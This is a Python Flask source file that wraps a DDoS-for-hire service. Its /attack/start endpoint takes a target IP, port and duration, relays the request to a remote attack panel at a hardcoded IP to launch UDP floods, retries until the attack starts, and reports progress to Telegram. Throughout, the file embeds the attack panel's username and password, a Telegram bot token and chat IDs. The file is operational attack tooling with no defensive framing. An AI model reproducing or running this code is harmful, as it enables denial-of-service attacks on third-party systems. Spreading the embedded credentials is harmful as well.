# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import requests
import logging
import time
import threading

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram Bot Configuration
BOT_TOKEN = "7951857029:AAGkVwayuNFbIK7b3SS6Ev0gZWdN0-bJb0E"
CHAT_IDS = [
    "8523310365",
    "7646520243"
]
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_telegram_message(message):
    """Send message to Telegram"""
    for chat_id in CHAT_IDS:
        if chat_id:
            try:
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                requests.post(TELEGRAM_API_URL, data=payload, timeout=5)
            except:
                pass

# ==================== TARGET APIS ====================
TARGET_APIS = [
    {"id": 6, "name": "API_6", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 7, "name": "API_7", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 8, "name": "API_8", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 9, "name": "API_9", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 10, "name": "API_10", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
]

def get_response_summary(response, response_time):
    summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
    try:
        json_data = response.json()
        summary += f"JSON: {json_data}"
    except:
        text = response.text.strip()
        if len(text) > 600:
            text = text[:600] + "... [truncated]"
        summary += f"Response: {text}"
    return summary

def is_attack_successful(response):
    if not response:
        return False
    try:
        data = response.json()
        if data.get('success') is True or data.get('error') is False:
            return True
        if data.get('error') is True:
            return False
        message = str(data.get('message', '')).lower()
        success_keywords = ['launched', 'started', 'success', 'ok', 'sent', 'attack']
        error_keywords = ['slot', 'busy', 'full', 'wait', 'limit', 'error', 'fail', 'denied']
        if any(word in message for word in success_keywords):
            return True
        if any(word in message for word in error_keywords):
            return False
    except:
        pass

    if response.status_code == 200:
        text = response.text.strip().lower()
        if not text or not any(word in text for word in ['slot', 'busy', 'full', 'wait', 'limit', 'error', 'fail']):
            return True
    return False

def send_attack(api, ip, port, duration):
    """Send attack without packet length"""
    target_url = api['url'].format(ip=ip, port=port, time=duration)
  
    max_retries = 8
    retry_count = 0
  
    while retry_count < max_retries:
        attempt = retry_count + 1
        start_time = time.time()
      
        try:
            response = requests.get(target_url, timeout=18)
            response_time = int((time.time() - start_time) * 1000)
          
            response_summary = get_response_summary(response, response_time)
          
            telegram_msg = f"""
🔵 <b>ATTACK REQUEST #{attempt}/{max_retries}</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Status: {response.status_code}
├ Response Time: {response_time}ms
└ Response:
{response_summary}
"""
            send_telegram_message(telegram_msg)
          
            if is_attack_successful(response):
                send_telegram_message(f"""
✅ <b>ATTACK SUCCESSFULLY STARTED</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Response Time: {response_time}ms
├ Attempt: {attempt}/{max_retries}
""")
                time.sleep(duration)
                send_telegram_message(f"""
✅ <b>ATTACK COMPLETED</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Duration: {duration}s
""")
                return {'success': True}
          
            else:
                retry_count += 1
                if retry_count < max_retries:
                    time.sleep(2)
              
        except Exception as e:
            retry_count += 1
            response_time = int((time.time() - start_time) * 1000)
            send_telegram_message(f"""
⚠️ <b>REQUEST FAILED</b> (Attempt {attempt}/{max_retries})
├ API: {api['name']}
├ Target: {ip}:{port}
├ Error: {str(e)[:180]}
├ Time: {response_time}ms
""")
            if retry_count < max_retries:
                time.sleep(min(2 ** retry_count, 10))

    send_telegram_message(f"""
💀 <b>ALL RETRIES FAILED</b> on {api['name']}
├ Target: {ip}:{port}
├ Attempts: {max_retries}
""")
    return {'success': False}

def execute_attack(api, ip, port, total_time):
    api['busy'] = True
    api['current_attack'] = {'ip': ip, 'port': port, 'time': total_time}
  
    send_telegram_message(f"""
🚀 <b>NEW ATTACK QUEUED</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Time: {total_time}s
""")
  
    result = send_attack(api, ip, port, total_time)
  
    api['busy'] = False
    api['current_attack'] = None
  
    status = "✅ SUCCESS" if result['success'] else "💀 FAILED"
    send_telegram_message(f"{status} | {api['name']} → {ip}:{port} ({total_time}s)")

@app.route('/attack/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time')
    # len_param is ignored now (kept for backward compatibility)
    len_param = request.args.get('len')  # still accepted but not used

    if not all([ip, port, time_param]):
        return jsonify({'error': 'Missing ip, port, or time'}), 400
  
    try:
        port = int(port)
        total_time = int(time_param)
        if total_time <= 0 or total_time > 3600:
            raise ValueError
    except ValueError:
        return jsonify({'error': 'Invalid parameters'}), 400
  
    selected_api = next((api for api in TARGET_APIS if not api['busy']), None)
  
    if not selected_api:
        return jsonify({'error': 'All APIs are busy'}), 503
  
    threading.Thread(
        target=execute_attack,
        args=(selected_api, ip, port, total_time),
        daemon=True
    ).start()
  
    return jsonify({
        'success': True,
        'api': selected_api['name'],
        'target': f'{ip}:{port}',
        'time': total_time,
        'note': 'len parameter is no longer used'
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'free': [api['name'] for api in TARGET_APIS if not api['busy']],
        'busy': [api['name'] for api in TARGET_APIS if api['busy']]
    })

if __name__ == '__main__':
    print("="*70)
    print("🚀 ATTACK API READY (No len parameter)")
    print("Endpoint: /attack/start?ip=...&port=...&time=...")
    print("="*70)
    app.run(host='0.0.0.0', port=8080, threaded=True)
